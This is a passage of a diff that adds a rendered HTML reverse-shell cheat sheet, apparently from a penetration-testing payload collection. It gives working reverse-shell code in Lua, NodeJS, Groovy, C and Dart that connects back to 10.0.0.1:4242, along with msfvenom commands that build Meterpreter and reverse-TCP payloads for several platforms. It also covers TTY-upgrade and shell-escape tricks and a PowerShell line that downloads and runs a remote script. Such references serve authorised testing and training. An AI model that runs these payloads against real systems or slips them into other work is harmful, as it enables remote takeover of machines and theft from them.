+strings <span class="hljs-keyword">reverse</span>.war | <span class="hljs-keyword">grep</span> jsp <span class="hljs-comment"># in order to get the name of the file</span>
+</code></pre>
+<h3 id="lua">Lua</h3>
+<p>Linux only</p>
+<pre><code class="lang-powershell">lua -e "require(<span class="hljs-string">'socket'</span>);require(<span class="hljs-string">'os'</span>);t=socket.tcp();t:connect(<span class="hljs-string">'10.0.0.1'</span>,<span class="hljs-string">'4242'</span>);os.execute(<span class="hljs-string">'/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3'</span>);"
+</code></pre>
+<p>Windows and Linux</p>
+<pre><code class="lang-powershell">lua5.1 -e '<span class="hljs-built_in">local</span> host, port = <span class="hljs-string">"10.0.0.1"</span>, <span class="hljs-number">4242</span> <span class="hljs-built_in">local</span> socket = require(<span class="hljs-string">"socket"</span>) <span class="hljs-built_in">local</span> tcp = socket.tcp() <span class="hljs-built_in">local</span> io = require(<span class="hljs-string">"io"</span>) tcp:connect(host, port); <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">do</span> <span class="hljs-built_in">local</span> cmd, <span class="hljs-built_in">status</span>, partial = tcp:receive() <span class="hljs-built_in">local</span> f = io.popen(cmd, <span class="hljs-string">"r"</span>) <span class="hljs-built_in">local</span> s = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">"*a"</span>) f:<span class="hljs-built_in">close</span>() tcp:send(s) <span class="hljs-keyword">if</span> <span class="hljs-built_in">status</span> == <span class="hljs-string">"closed"</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">break</span> end end tcp:<span class="hljs-built_in">close</span>()'
+</code></pre>
+<h3 id="nodejs">NodeJS</h3>
+<pre><code class="lang-javascript">(<span class="hljs-name">function</span>(){
+    var net = require(<span class="hljs-string">"net"</span>),
+        cp = require(<span class="hljs-string">"child_process"</span>),
+        sh = cp.spawn(<span class="hljs-string">"/bin/sh"</span>, [])<span class="hljs-comment">;</span>
+    var client = new net.Socket()<span class="hljs-comment">;</span>
+    client.connect(<span class="hljs-name">4242</span>, <span class="hljs-string">"10.0.0.1"</span>, function(){
+        client.pipe(<span class="hljs-name">sh.stdin</span>)<span class="hljs-comment">;</span>
+        sh.stdout.pipe(<span class="hljs-name">client</span>)<span class="hljs-comment">;</span>
+        sh.stderr.pipe(<span class="hljs-name">client</span>)<span class="hljs-comment">;</span>
+    })<span class="hljs-comment">;</span>
+    return /a/<span class="hljs-comment">; // Prevents the Node.js application form crashing</span>
+})()<span class="hljs-comment">;</span>
+
+
+or
+
+require(<span class="hljs-symbol">'child_process</span>').exec(<span class="hljs-symbol">'nc</span> -e /bin/sh <span class="hljs-number">10.0</span>.0.1 <span class="hljs-number">4242</span>')
+
+or
+
+-var x = global.process.mainModule.require
+-x(<span class="hljs-symbol">'child_process</span>').exec(<span class="hljs-symbol">'nc</span> <span class="hljs-number">10.0</span>.0.1 <span class="hljs-number">4242</span> -e /bin/bash')
+
+or
+
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+</code></pre>
+<h3 id="groovy">Groovy</h3>
+<p>by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a>
+NOTE: Java reverse shell also work for Groovy</p>
+<pre><code class="lang-java"><span class="hljs-keyword">String</span> host=<span class="hljs-string">"10.0.0.1"</span>;
+<span class="hljs-keyword">int</span> port=<span class="hljs-number">4242</span>;
+<span class="hljs-keyword">String</span> cmd=<span class="hljs-string">"cmd.exe"</span>;
+<span class="hljs-built_in">Process</span> p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pi.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(pe.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pe.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(si.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-built_in">write</span>(si.<span class="hljs-built_in">read</span>());so.<span class="hljs-built_in">flush</span>();po.<span class="hljs-built_in">flush</span>();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-built_in">try</span> {p.<span class="hljs-built_in">exitValue</span>();<span class="hljs-built_in">break</span>;}<span class="hljs-built_in">catch</span> (Exception e){}};p.destroy();s.<span class="hljs-built_in">close</span>();
+</code></pre>
+<h4 id="groovy-alternative-1">Groovy Alternative 1</h4>
+<p><strong>NOTE</strong>: This is more stealthy</p>
+<pre><code class="lang-java">Thread<span class="hljs-selector-class">.start</span> {
+    <span class="hljs-comment">// Reverse shell here</span>
+}
+</code></pre>
+<h3 id="c">C</h3>
+<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p>
+<pre><code class="lang-csharp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
+
+<span class="hljs-built_in">int</span> main(void){
+    <span class="hljs-built_in">int</span> port = <span class="hljs-number">4242</span><span class="hljs-comment">;</span>
+    struct sockaddr_in revsockaddr<span class="hljs-comment">;</span>
+
+    <span class="hljs-built_in">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
+    revsockaddr.sin_family = AF_INET<span class="hljs-comment">;</span>
+    revsockaddr.sin_port = htons(port)<span class="hljs-comment">;</span>
+    revsockaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"10.0.0.1"</span>)<span class="hljs-comment">;</span>
+
+    connect(sockt, (struct sockaddr *) &amp;revsockaddr,
+    sizeof(revsockaddr))<span class="hljs-comment">;</span>
+    dup2(sockt, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
+    dup2(sockt, <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
+    dup2(sockt, <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
+
+    char * <span class="hljs-keyword">const</span> argv[] = {<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>}<span class="hljs-comment">;</span>
+    execve(<span class="hljs-string">"/bin/sh"</span>, argv, <span class="hljs-literal">NULL</span>)<span class="hljs-comment">;</span>
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+}
+</code></pre>
+<h3 id="dart">Dart</h3>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:convert'</span>;
+
+main() {
+  Socket.<span class="hljs-built_in">connect</span>(<span class="hljs-string">"10.0.0.1"</span>, <span class="hljs-number">4242</span>).then((socket) {
+    socket.<span class="hljs-built_in">listen</span>((data) {
+      <span class="hljs-built_in">Process</span>.start(<span class="hljs-string">'powershell.exe'</span>, []).then((<span class="hljs-built_in">Process</span> <span class="hljs-built_in">process</span>) {
+        <span class="hljs-built_in">process</span>.stdin.writeln(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>.fromCharCodes(data).trim());
+        <span class="hljs-built_in">process</span>.stdout
+          .transform(utf8.decoder)
+          .<span class="hljs-built_in">listen</span>((output) { socket.<span class="hljs-built_in">write</span>(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}
+</code></pre>
+<h2 id="revshells">RevShells</h2>
+<p><a href="https://www.revshells.com/">https://www.revshells.com/</a>
+<img src="https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png" alt="image"></p>
+<h2 id="meterpreter-shell">Meterpreter Shell</h2>
+<h3 id="windows-staged-reverse-tcp">Windows Staged reverse TCP</h3>
+<pre><code class="lang-powershell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">4242</span> -f exe &gt; reverse.exe
+</code></pre>
+<h3 id="windows-stageless-reverse-tcp">Windows Stageless reverse TCP</h3>
+<pre><code class="lang-powershell">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">4242</span> -f exe &gt; reverse.exe
+</code></pre>
+<h3 id="linux-staged-reverse-tcp">Linux Staged reverse TCP</h3>
+<pre><code class="lang-powershell">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">4242</span> -f elf &gt;reverse.elf
+</code></pre>
+<h3 id="linux-stageless-reverse-tcp">Linux Stageless reverse TCP</h3>
+<pre><code class="lang-powershell">msfvenom -p linux/x86/shell_reverse_tcp LHOST=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> LPORT=<span class="hljs-number">4242</span> -f elf &gt;reverse.elf
+</code></pre>
+<h3 id="other-platforms">Other platforms</h3>
+<pre><code class="lang-powershell">$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f elf &gt; <span class="hljs-keyword">shell</span>.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f exe &gt; <span class="hljs-keyword">shell</span>.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f macho &gt; <span class="hljs-keyword">shell</span>.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f asp &gt; <span class="hljs-keyword">shell</span>.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f raw &gt; <span class="hljs-keyword">shell</span>.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f war &gt; <span class="hljs-keyword">shell</span>.war
+$ msfvenom -p cmd/unix/reverse_python LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f raw &gt; <span class="hljs-keyword">shell</span>.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f raw &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span>
+$ msfvenom -p cmd/unix/reverse_perl LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f raw &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">pl</span>
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="hljs-string">"10.0.0.1"</span> LPORT=4242 -f raw &gt; <span class="hljs-keyword">shell</span>.php; <span class="hljs-keyword">cat</span> <span class="hljs-keyword">shell</span>.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -<span class="hljs-keyword">d</span> '\<span class="hljs-keyword">n</span>' &gt; <span class="hljs-keyword">shell</span>.php &amp;&amp; pbpaste &gt;&gt; <span class="hljs-keyword">shell</span>.php
+</code></pre>
+<h2 id="spawn-tty-shell">Spawn TTY Shell</h2>
+<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p>
+<pre><code class="lang-powershell">rlwrap nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span>
+
+rlwrap -r -f . nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span>
+-f . will make rlwrap use <span class="hljs-keyword">the</span> current history <span class="hljs-built_in">file</span> <span class="hljs-keyword">as</span> a completion <span class="hljs-built_in">word</span> <span class="hljs-built_in">list</span>.
+-r Put all <span class="hljs-built_in">words</span> seen <span class="hljs-keyword">on</span> <span class="hljs-keyword">in</span>- <span class="hljs-keyword">and</span> output <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> completion <span class="hljs-built_in">list</span>.
+</code></pre>
+<p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p>
+<p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p>
+<blockquote>
+<p>The main problem here is that zsh doesn&#39;t handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
+</blockquote>
+<pre><code class="lang-powershell">ctrl+z
+<span class="hljs-built_in">echo</span> <span class="hljs-variable">$TERM</span> &amp;&amp; tput lines &amp;&amp; tput cols
+
+<span class="hljs-comment"># for bash</span>
+stty raw -echo
+<span class="hljs-built_in">fg</span>
+
+<span class="hljs-comment"># for zsh</span>
+stty raw -echo; <span class="hljs-built_in">fg</span>
+
+reset
+<span class="hljs-built_in">export</span> SHELL=bash
+<span class="hljs-built_in">export</span> TERM=xterm-256color
+stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre>
+<p>or use <code>socat</code> binary to get a fully tty reverse shell</p>
+<pre><code class="lang-bash">socat file:`tty`,raw,echo=<span class="hljs-number">0</span> tcp-listen:<span class="hljs-number">12345</span>
+</code></pre>
+<p>Spawn a TTY shell from an interpreter</p>
+<pre><code class="lang-powershell">/bin/sh -i
+python3 -c <span class="hljs-string">'import pty; pty.spawn("</span>/bin/sh<span class="hljs-string">")'</span>
+python3 -c <span class="hljs-string">"__import__('</span>pty').spawn(<span class="hljs-string">'/bin/bash'</span>)<span class="hljs-string">"
+python3 -c "</span>__import__(<span class="hljs-string">'subprocess'</span>).call([<span class="hljs-string">'/bin/bash'</span>])<span class="hljs-string">"
+perl -e '</span><span class="hljs-built_in">exec</span> <span class="hljs-string">"/bin/sh"</span>;<span class="hljs-string">'
+perl: exec "</span>/bin/sh<span class="hljs-string">";
+perl -e '</span>print `/bin/bash`<span class="hljs-string">'
+ruby: exec "</span>/bin/sh<span class="hljs-string">"
+lua: os.execute('</span>/bin/sh')
+</code></pre>
+<ul>
+<li>vi: <code>:!bash</code></li>
+<li>vi: <code>:set shell=/bin/bash:shell</code></li>
+<li>nmap: <code>!sh</code></li>
+<li>mysql: <code>! bash</code></li>
+</ul>
+<p>Alternative TTY method</p>
+<pre><code>www-data<span class="hljs-variable">@debian</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>su - user
+<span class="hljs-symbol">su:</span> must be run from a terminal
+
+www-data<span class="hljs-variable">@debian</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>/usr/bin/script -qc /bin/bash /dev/null
+www-data<span class="hljs-variable">@debian</span><span class="hljs-symbol">:/dev/shm</span><span class="hljs-variable">$ </span>su - user
+<span class="hljs-symbol">Password:</span> P4ssW0rD
+
+user<span class="hljs-variable">@debian</span><span class="hljs-symbol">:~</span>$
+</code></pre><h2 id="fully-interactive-reverse-shell-on-windows">Fully interactive reverse shell on Windows</h2>
+<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p>
+<p><strong>ConPtyShell uses the function <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p>
+<p>Server Side:</p>
+<pre><code>stty raw -echo; (stty <span class="hljs-built_in">size</span>; <span class="hljs-built_in">cat</span>) | nc -lvnp <span class="hljs-number">3001</span>
+</code></pre><p>Client Side:</p>
+<pre><code>IEX(IWR https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/antonioCoco/</span>ConPtyShell<span class="hljs-regexp">/master/</span>Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span> <span class="hljs-number">3001</span>
+</code></pre><p>Offline version of the ps1 available at --&gt; <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</a></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner">Reverse Bash Shell One Liner</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey - Cheat Sheet Reverse shell</a></li>
+<li><a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a></li>
+<li><a href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell">Obtaining a fully interactive shell</a></li>
+</ul>
+
